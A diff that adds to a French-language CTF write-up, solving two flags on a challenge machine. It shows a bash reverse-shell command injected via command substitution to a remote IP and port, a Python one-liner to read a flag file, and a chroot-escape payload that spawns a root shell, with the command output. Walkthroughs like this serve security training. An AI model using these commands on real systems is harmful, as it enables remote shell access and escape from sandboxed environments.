@@ -71,11 +71,98 @@ OSError: out of pty devices
 ```
 Oh ... 
 
-Bon c'est peut-etre pas le temps de faire des challenges de reverse shell!
+## Edit:
+On m'a informer que ceci arrivais dans le CTF egalement, donc j'y suis aller directement en bash
+```
+$(bash -i >& /dev/tcp/$IP/$PORT 0>&1)
+```
 
-On peut decouvrir que les binaires possible d'utilise sont
-`bash ls rm touch` et bien entendue python!
-On se rend egalement compte que nous somme dans un `chroot`
-Le concept etait de memoire de cree un nouveau `chroot` dans un dossier ou nous somme presentement a l'exterieur via l'executable python
+Et ben voila!
+```
+bash: cannot set terminal process group (92): Inappropriate ioctl for device
+bash: no job control in this shell
+bash-5.1# ls
+ls
+__pycache__
+app.py
+bin
+etc
+flag1
+get-pip.py
+lib
+lib64
+python
+root
+templates
+usr
+```
+Avec un petit one-liner python 
+```
+./python/bin/python -c "print(open('flag1').read())"
+```
+```
+bash-5.1# ./python/bin/python -c "print(open('flag1').read())"
+./python/bin/python -c "print(open('flag1').read())"
+FINCTF{Je-vous-4ssure-personne-ne-p3ut-obtenir-l3-seucrait!}
+```
 
-Si l'instance se fait corriger je le terminerai! Pour le moment ma memoire de poisson mort ne se souvient plus!
+# Flag 2 : Get out of jail.. (plutot chroot)
+
+Donc, nous avons python.
+```
+if not os.path.exists("chroot"):
+    os.mkdir("chroot")
+os.chroot("chroot")
+```
+Je me cree une tout nouvelle prison!
+
+Et j'envoie le payload suivant: https://tbhaxor.com/breaking-out-of-chroot-jail-shell-environment/
+```python
+import os; os.chroot("chroot"); [os.chdir("..") for _ in range(10)]; os.chroot("."); os.system("/bin/sh");
+```
+
+Resultat:
+```
+ls
+bin
+boot
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+```
+
+Je vais fouiller dans /root
+```
+cd /root
+ls
+app.py
+app.zip
+chroot
+create-env.sh
+flag1
+flag2
+index.html
+libnsl.so.2
+libnsl.so.2.0.1
+python.zip
+cat flag2
+FINCTF{n0o0o0o0-Nicéphore-va-devoir-travailler-très-tard}
+```
+
+Et ben voila!
